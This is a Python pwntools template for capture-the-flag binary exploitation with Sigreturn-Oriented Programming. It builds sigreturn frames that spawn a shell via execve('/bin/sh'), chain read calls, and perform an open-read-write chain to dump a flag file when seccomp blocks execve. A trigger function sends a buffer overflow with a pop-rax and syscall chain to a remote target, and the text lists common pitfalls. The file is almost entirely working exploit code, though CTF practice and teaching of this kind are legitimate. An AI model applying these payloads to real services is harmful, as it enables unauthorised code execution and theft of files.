#!/usr/bin/env python3
"""
srop_frame.py -- SigreturnFrame template for short-BOF pwn challenges.

Use SROP (Sigreturn-Oriented Programming) when:
  - BOF is too small for a full ROP chain (e.g. < 0x80 bytes after RIP)
  - Binary lacks pop rdi / pop rsi / pop rdx but HAS a syscall gadget
  - Static binary, no libc -- only kernel syscalls available
  - You need to set every register at once (rax, rdi, rsi, rdx, r10, r8, r9, rip, rsp)

Required gadgets (any one of):
  - syscall ; ret           (rare in static binaries)
  - syscall                 (terminal — fine if it's the last step)
  - mov rax, 0xf ; syscall  (sigreturn directly)

Find with:
  pwn_ropgadget(binary, "syscall")
  pwn_ropgadget(binary, "mov eax, 0xf")
"""
from pwn import *

context.binary = elf = ELF("./chall")
context.arch = "amd64"  # or "i386"

HOST, PORT = "1.2.3.4", 1337


def conn():
    if args.LOCAL:
        return process(elf.path)
    return remote(HOST, PORT)


# ----------------------------------------------------------------------
# Step 1: leak rsp (or use known stack offset) so we can pivot to a frame
# we control. If you have a known buffer address, skip this.
# ----------------------------------------------------------------------

# ----------------------------------------------------------------------
# Step 2: build the frame
# ----------------------------------------------------------------------

# Example A: execve("/bin/sh", 0, 0) via SROP — needs writable address for "/bin/sh"
def srop_execve(syscall_addr, binsh_addr, new_rsp):
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve   # 59 on amd64
    frame.rdi = binsh_addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_addr
    frame.rsp = new_rsp                 # so the syscall returns somewhere sane
    return bytes(frame)


# Example B: read(0, writable, 0x100) via SROP — used to chain another frame
def srop_read(syscall_addr, dest, length, next_rsp):
    frame = SigreturnFrame()
    frame.rax = constants.SYS_read
    frame.rdi = 0
    frame.rsi = dest
    frame.rdx = length
    frame.rip = syscall_addr
    frame.rsp = next_rsp
    return bytes(frame)


# Example C: open + read + write (ORW) when seccomp blocks execve
def srop_orw_chain(syscall_addr, filename_addr, scratch_addr):
    """
    Returns 3 frames concatenated. After overflow + sigreturn trigger:
      Frame 1: open(filename, 0) -> fd in rax
      Frame 2: read(3, scratch, 0x100) -- assume fd=3
      Frame 3: write(1, scratch, 0x100)
    Each frame's rsp points to the next.
    """
    # Layout in scratch: [filename]["flag.txt\0..."][nextframe1][nextframe2]
    f1 = SigreturnFrame()
    f1.rax = constants.SYS_open
    f1.rdi = filename_addr
    f1.rsi = 0
    f1.rip = syscall_addr
    f1.rsp = scratch_addr + 0x100  # frame 2 starts here

    f2 = SigreturnFrame()
    f2.rax = constants.SYS_read
    f2.rdi = 3                       # assumes open() returned fd 3
    f2.rsi = scratch_addr + 0x800
    f2.rdx = 0x100
    f2.rip = syscall_addr
    f2.rsp = scratch_addr + 0x200

    f3 = SigreturnFrame()
    f3.rax = constants.SYS_write
    f3.rdi = 1
    f3.rsi = scratch_addr + 0x800
    f3.rdx = 0x100
    f3.rip = syscall_addr
    f3.rsp = scratch_addr + 0x300    # whatever, exits after this

    return bytes(f1) + bytes(f2) + bytes(f3)


# ----------------------------------------------------------------------
# Step 3: trigger
# ----------------------------------------------------------------------
def trigger_sigreturn(io, syscall_addr, sigreturn_setup_addr):
    """
    Two ways to trigger sigreturn:
      A) `mov rax, 0xf ; syscall` gadget (rare but ideal)
      B) `pop rax ; ret` then `syscall ; ret` with rax=0xf
    """
    payload = b"A" * OFFSET
    payload += p64(POP_RAX)
    payload += p64(0xf)               # SYS_rt_sigreturn
    payload += p64(syscall_addr)
    payload += srop_execve(syscall_addr, BINSH_ADDR, NEW_RSP)
    io.sendline(payload)


# ----------------------------------------------------------------------
# Common gotchas
# ----------------------------------------------------------------------
# 1. SigreturnFrame defaults to context.arch — set context.arch FIRST
# 2. The frame is exactly 0xf8 bytes on amd64. Don't truncate it.
# 3. After sigreturn, the kernel restores ALL regs from the frame. If
#    rsp points to garbage, the next instruction will crash. Always set
#    rsp to a controlled writable area.
# 4. CS/SS/EFLAGS are auto-filled by SigreturnFrame; don't override.
# 5. Static binaries: scan .text for `mov eax, 0xf ; syscall` directly.
# 6. Need writable + executable address for "/bin/sh\0"? mprotect via SROP first.
